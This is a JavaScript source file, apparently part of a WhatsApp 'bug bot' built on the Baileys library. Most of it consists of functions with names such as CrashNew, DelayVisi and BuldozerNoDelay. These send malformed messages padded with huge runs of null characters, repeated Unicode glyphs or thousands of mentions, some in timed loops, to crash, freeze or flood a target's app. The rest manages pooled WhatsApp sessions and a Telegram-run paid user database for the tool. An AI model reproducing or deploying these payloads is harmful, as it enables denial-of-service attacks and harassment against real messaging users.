g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function DelayVisi(sock, targetJid) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VISI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(900000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(targetJid, Msg, {
      participant: { jid: targetJid }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function VisiIos(sock, targetJid) {
  const Msg = {
    locationMessage: {
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    } 
  }; 

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function VisiBlanking(sock, targetJid) {
  const Msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "VISI",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  id: null
                })
              }
            ],
            version: 3
          }
        }
      }
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function DelayVisi(sock, targetJid) {
  const RumahRoblokKa = generateWAMessageFromContent(
    targetJid,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VSX",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"visi","landmark_area":"X","address":"RumahRoblokKa","tower_number":"RumahRoblokKa","city":"arab","name":"RumahRoblokKa","phone_number":"999999999999","house_number":"xxx","floor_number":"smkui","state":"RumahRoblokKa | ${"\u0000".repeat(900000)}"}}`,
              version: 3
            }
          }
        }
      }
    },
    {
      userJid: targetJid,
      quoted: null
    }
  );

  await sock.relayMessage(targetJid, RumahRoblokKa.message, {
    participant: { jid: targetJid },
    messageId: RumahRoblokKa.key.id
  });
}

async function newDelay(sock, targetJid) {
  const Msg = {
    groupStatusMessageV2: {
      message: {
        orderMessage: {
          itemCount: 99999,
          status: 1,
          surface: 1,
          message: "\u0000".repeat(250000),
          orderTitle: "\u0000".repeat(300000),
          sellerJid: "0@s.whatsapp.net",
          token: "visi",
          totalAmount1000: 0,
          totalCurrencyCode: "USD",
          contextInfo: {
            mentionedJid: Array.from({ length: 5000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
          }
        }
      }
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function BuldozerNoDelay(sock, targetJid) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "\u0000",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, () => ({
                  type: 1
                }))
              }
            },
            body: {
              text: "VISI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "{ X: { status:true } }",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 9000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(targetJid, Msg, {
      participant: { jid: targetJid }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function NullBlank(sock, targetJid) {
  await sock.relayMessage(targetJid, {
    groupInviteMessage: {
      groupJid: "676767676767676767@g.us",
      inviteCode: "XxX",
      caption: "\u0000".repeat(150000),
      groupName: "\u0000".repeat(150000),
      inviteExpiration: 0 
    }
  }, { 
    participant: { jid: targetJid } 
  });
}

async function CrashNew(sock, targetJid) {
  const Msg = {
    stickerPackMessage: {
      stickerPackId: "VISI",
      name: "VISI",
      publisher: "VISI",
      caption: "VISI",
      packDescription: "VISI",
      stickerPackOrigin: 2, 
      stickers: [
        {
          fileName: "sticker.webp",
          isAnimated: true,
          emojis: ["🤯"],
          mimetype: "image/webp"
        }
      ],
      fileLength: "10610",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      mediaKeyTimestamp: "1775044724", 
      stickerPackSize: "999",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999
      }
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function AlbumUi(sock, targetJid) {
  const Msg = {
    albumMessage: {
      messages: [],
      expectedImageCount: 1000, 
      expectedVideoCount: 1000
    },
    messageContextInfo: {
      deviceListMetadata: {
        senderKeyHash: "VISI",
        senderTimestamp: "9999999999999",
        senderKeyIndex: 99999,
        recipientKeyHash: "VISI",
        recipientTimestamp: "9999999999999",
        recipientKeyIndex: 99999
      },
      deviceListMetadataVersion: 2 
    }
  };

  await sock.relayMessage(targetJid, Msg, {
    participant: { jid: targetJid }
  });
}

async function BULDOZER (sock,targetJid) {
    
    const msg2 = {
        viewOnceMessage: {
            message: {
        listMessage: {
    title: "\u0000".repeat(35000),
    description: "\u0000".repeat(50000),
    buttonText: "Iamsatz",
    footerText: "",
    listType: 1,

    sections: [
      {
        title: "",
        rows: Array.from({ length: 5 }, (_, i) => ({
          title: `\u0000`.repeat(35000),
          description: `\u0000`.repeat(150000),
          rowId: null
        }))
      }
    ],
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                mentionedJid: [ targetJid ]
                }
  }
}
            }
        }
         
        await sock.relayMessage(targetJid,msg2,{
            participant: { jid: targetJid }
            })
}

async function ZyXNgaceng(sock, targetJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        locationMessage: {}
      }
    },
    interactiveResponseMessage: {
      header: {
        title: "Maklu Gw Ewe" + "{".repeat(90000)
      },
      body: {
        text: "Ridzz Nieh Boyzz"
      },
      nativeFlowResponseMessage: {
        responseParamsJson: "\u0000".repeat(10000)
      }
    }
  };

  await sock.relayMessage(targetJid, msg, {});
}

async function MyFakePlasticLove(sock, targetJid) {
  const album = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1"
  };

  const xyrr = {
    albumMessage: {
      stickerMessage: album,
      contextInfo: {
        quotedMessage: {
          stickerMessage: {
            ...album,
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(targetJid, xyrr, {});

  await sock.relayMessage(
    targetJid,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      messageId: msg.key.id,
      participant: { jid: targetJid }
    }
  );

  await new Promise((r) => setTimeout(r, 500));
}

async function EfcihNihTodd(sock, targetJid) {
  try {
    for (let i = 0; i < 5000; i++) {

      await sock.sendMessage(targetJid, {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/m1/v/t24/An-qss16gfa27i8We5RUTHibYUzSuagepuRHNmgi77hh17XMu07yngcd4N4Q1lXyqymQ1MRqnOjUJqm4bOPAxDFF_S_YBvqnI_SrYg7-KcGoGdZ2Jlvj0-EUl-FoHxozVA?ccb=10-5&oh=01_Q5Aa3gH5jIXgo_TCy55Ec51fAc31uBa4R28GUnNS6f3hORc80w&oe=698C995A&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",

              fileSha256: Buffer.from("JBsntfn6t5hXBp2VH91K2tuMf49pmFPIwFjshrA2WhI=", "base64"),
              fileEncSha256: Buffer.from("bbfSmz2AGsh1wLcTEWbJYJyz1ev4fFVhilYY8xJDQLI=", "base64"),
              mediaKey: Buffer.from("xWD083UnPcnqnBtnLbpqQHCFI5u35p5AzGFLHzGR7CM=", "base64"),

              caption: "\u0000".repeat(9000),

              width: 1080,
              height: 1080,
              directPath: "/m1/v/t24/An-qss16gfa27i8We5RUTHibYUzSuagepuRHNmgi77hh17XMu07yngcd4N4Q1lXyqymQ1MRqnOjUJqm4bOPAxDFF_S_YBvqnI_SrYg7-KcGoGdZ2Jlvj0-EUl-FoHxozVA?ccb=10-5&oh=01_Q5Aa3gH5jIXgo_TCy55Ec51fAc31uBa4R28GUnNS6f3hORc80w&oe=698C995A&_nc_sid=5e03e0",
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAsAAABBQEAAAAAAAAAAAAAAAAGAAECAwQFAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAAjaSKhcpqAAwzuEHL6cCbPQNpoYiooldG05urNwwlkP90Usm4r0KsCs5PeDWSyggRckxNajE//xAAnEAACAgIBAwMEAwAAAAAAAAABAgADBBERSBBAREyFBUxQv/aAAgBAQABPwAH2jAMNEQDi2vJBnXKWF4s+DACSAJgYyVNVtxzCe3bLwrMt/LhQp+3sRuNYiFQT5Mvx0yK2R/IMp6QlFwd25Sqm0dVZz4UCAgx+OwD89vIEbHD2I5PleyXrZc1YB2sZFVtHwG+ZXQ1TEq5I/BgIf8ARE2N6jWWJYANan1Fc+oXf6helX5jezPWR0IMptDALvyJqYd1myl/9qiGlWYtyP3Q4w8aM9BdERKB55e+4uOgBE9AJtlJ3FOwDL1QlnDaZhx3MvJysdUr9TyDOndRyL7lqeyWZVdT6fwPzD1bBB1zlV1dy8q2BHZgdggyjMetnZ9sNeIbDY5ZwWgsXGcBBo695dfbaxLuT26CbOVg/wAQ9qOi1VhxY/Kfx2NTU3BJkV2JkOLPeOpExsDIySOCeJg4a4lPAR1LIQDo/BlCOlYWx+Tfmf/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AB//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AB//Z", "base64"),

              contextInfo: {
                groupStatusMessageV2: {
                  message: {
                    protocolMessage: { type: 0 }
                  }
                }
              }
            },

            extendedTextMessage: {
              text: "GW GANTENG GA?"
            }
          }
        }
      });

      await new Promise(r => setTimeout(r, 700));
    }

    console.log("success");
  } catch (e) {
    console.log("error:", e);
  }
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const cacheKey = buildSessionCacheKey(folderPath, sessionName);
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[cacheKey] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[cacheKey] = sock;
          } else if (type === "Messenger") {
            mess[cacheKey] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (deletingSessions.has(cacheKey)) {
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
            deletingSessions.delete(cacheKey);
            resolve();
            return;
          }

          if (statusCode === 440) {
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);
    const cacheKey = buildSessionCacheKey(sessionFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[cacheKey]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 
  const cacheKey = buildSessionCacheKey(owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      if (deletingSessions.has(cacheKey)) {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
        removeSessionArtifacts(path.join('permenmd', owner), number);
        deletingSessions.delete(cacheKey);
        return;
      }

      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
      }
    } else if (connection === "open") {
      activeConnections[cacheKey] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      const type = detectWATypeFromCreds(sourceCreds);

      if (type === "Business") {
        biz[cacheKey] = sock;
      } else if (type === "Messenger") {
        mess[cacheKey] = sock;
      }

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`✘ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


async function startUserSessions() {
  // Ambil semua subfolder dalam permenmd
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;
      const cacheKey = buildSessionCacheKey(folder, sessionName);

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[cacheKey]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName); // gunakan await kalau connectSession async
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSessions = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    const sock = activeConnections[cacheKey];
    if (sock) {
      activeSessions.push({
        sock,
        sessionName,
        cacheKey,
      });
    }
  }

  if (!activeSessions.length) {
    return null;
  }

  return activeSessions[Math.floor(Math.random() * activeSessions.length)];
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], developerList: [], userList: [] }, null, 2));
  }

  const config = JSON.parse(fs.readFileSync(telegramDataPath));
  if (!Array.isArray(config.ownerList)) config.ownerList = [];
  if (!Array.isArray(config.userList)) config.userList = [];
  if (!Array.isArray(config.developerList)) config.developerList = [];
  return config;
}

function saveTelegramConfig(config) {
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🆔 ${u.telegramId || '-'} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

function findUserByIdentity(db, identity) {
  const normalized = String(identity || "").trim();
  if (!normalized) return null;

  return db.find((user) => {
    const username = String(user.username || "").trim();
    const telegramId = String(user.telegramId || "").trim();
    return username === normalized || telegramId === normalized;
  }) || null;
}

function extendUserExpiry(user, addDays) {
  const parsedDays = parseInt(addDays, 10);
  if (Number.isNaN(parsedDays) || parsedDays <= 0) {
    return { ok: false, message: "✘ Jumlah hari tidak valid." };
  }

  const baseDate = new Date(user.expiredDate);
  const startDate = Number.isNaN(baseDate.getTime()) || baseDate < new Date()
    ? new Date()
    : baseDate;

  startDate.setDate(startDate.getDate() + parsedDays);
  user.expiredDate = startDate.toISOString().split("T")[0];

  return { ok: true, expiredDate: user.expiredDate };
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Group Role & Account Management =====
const GROUP_ROLE_FILE = path.join(__dirname, "telegram-groups.json");
const pendingGroupAccounts = new Map();
const pendingCustomDurations = new Map();
// Menyimpan status proses pembuatan akun personal per Telegram ID.
const userSessionState = Object.create(null);

function loadGroupRoles() {
  if (!fs.existsSync(GROUP_ROLE_FILE)) fs.writeFileSync(GROUP_ROLE_FILE, JSON.stringify({}, null, 2));
  try { return JSON.parse(fs.readFileSync(GROUP_ROLE_FILE, "utf8")) || {}; }
  catch { return {}; }
}
function saveGroupRoles(data) { fs.writeFileSync(GROUP_ROLE_FILE, JSON.stringify(data, null, 2)); }
function getGroupRole(chatId) { return loadGroupRoles()[String(chatId)] || null; }
function normalizeRoleName(value) {
  const role = String(value || "member").trim().toLowerCase();
  return role || "member";
}
function getTelegramAccount(telegramId) {
  return loadDatabase().find(user => String(user.telegramId || "") === String(telegramId)) || null;
}
function isTelegramAuthorized(userId) {
  const config = loadTelegramConfig();
  const id = Number(userId);
  const owners = config.ownerList.map(Number);
  const developers = config.developerList.map(Number);
  const users = config.userList.map(Number);
  return id === Number(OWNER_ID) || owners.includes(id) || developers.includes(id) || users.includes(id) || Boolean(getTelegramAccount(id));
}
function isTelegramAdmin(userId) {
  const config = loadTelegramConfig();
  const id = Number(userId);
  return id === Number(OWNER_ID) || config.ownerList.map(Number).includes(id) || config.developerList.map(Number).includes(id);
}
function generateAccountPassword() { return crypto.randomBytes(6).toString("base64url"); }
function createGroupAccount(chatId, member, role) {
  const db = loadDatabase();
  const telegramId = String(member.id);
  let account = db.find(user => String(user.telegramId || "") === telegramId);
  const expiry = new Date(); expiry.setDate(expiry.getDate() + 30);
  if (!account) {
    let username = String(member.username || `tg_${telegramId}`).toLowerCase().replace(/[^a-z0-9_]/g, "_").slice(0, 24);
    if (db.some(user => user.username === username)) username = `tg_${telegramId}`;
    account = { telegramId, telegramUsername: member.username || "", username, password: generateAccountPassword(), role: normalizeRoleName(role), groupId: String(chatId), verified: true, expiredDate: expiry.toISOString().split("T")[0] };
    db.push(account);
  } else {
    account.telegramUsername = member.username || account.telegramUsername || "";
    account.groupId = String(chatId); account.role = normalizeRoleName(role); account.verified = true;
  }
  saveDatabase(db); return account;
}
function revokeGroupAccount(telegramId, chatId) {
  const db = loadDatabase();
  const kept = db.filter(user => !(String(user.telegramId || "") === String(telegramId) && String(user.groupId || "") === String(chatId)));
  if (kept.length !== db.length) saveDatabase(kept);
}
async function verifyGroupMember(msg, member) {
  const role = getGroupRole(msg.chat.id);
  if (!role || !member || member.is_bot) return;
  const account = createGroupAccount(msg.chat.id, member, role);
  await bot.sendMessage(msg.chat.id, `Verifikasi berhasil.\nRole: ${account.role}\nUsername: ${account.username}\nPassword: ${account.password}`, { reply_to_message_id: msg.message_id }).catch(() => {});
}

async function finalizeTelegramAccount(telegramId, pending, days) {
  const db = loadDatabase();
  const oldByUsername = db.find(user => user.username === pending.username);
  const oldPersonal = db.find(user => String(user.telegramId || "") === String(telegramId));
  if (oldByUsername && oldByUsername !== oldPersonal) return bot.sendMessage(telegramId, "Username sudah digunakan.");
  const expired = new Date(); expired.setDate(expired.getDate() + days);
